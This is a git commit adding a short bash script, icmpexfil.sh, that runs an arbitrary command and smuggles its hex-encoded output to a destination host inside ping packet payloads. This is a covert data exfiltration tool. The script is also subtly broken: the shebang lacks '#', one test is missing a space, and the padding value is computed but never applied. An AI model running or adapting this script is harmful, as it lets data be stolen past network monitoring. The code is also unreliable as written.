ab09eb213cd0c820fdb69ee737811761f86f417e
rover33 <remy.j.pearlstone@gmail.com>
2020-12-03 20:05:20 -0700

    Create icmpexfil.sh

---
+++ icmpexfil.sh
@@ -0,0 +1,28 @@
+!/usr/bin/env bash
+
+echo "${@:2}"
+if [[-z "$1" ]] || [[ -z "$2" ]];
+then
+        echo "usage : icmpexfil.sh <destination> <command>"
+        exit
+fi
+
+DEST=$1 
+CMD=${@:2}
+OUTPUT=$($CMD | xxd -p -c 16)
+
+ORG=$IFS
+
+IFS=$(echo -en "\n\b")
+
+for ROW in ${OUTPUT[@]}
+do
+        if [[ ${#ROW} = 32 ]]; then
+                PAYLOAD=$ROW
+        else 
+                PAD=$(printf "%0$(expr 32 - ${#ROW})d" 0)
+        fi
+        ping -c 1 -p $PAYLOAD $DEST
+
+done
+IFS=$ORG
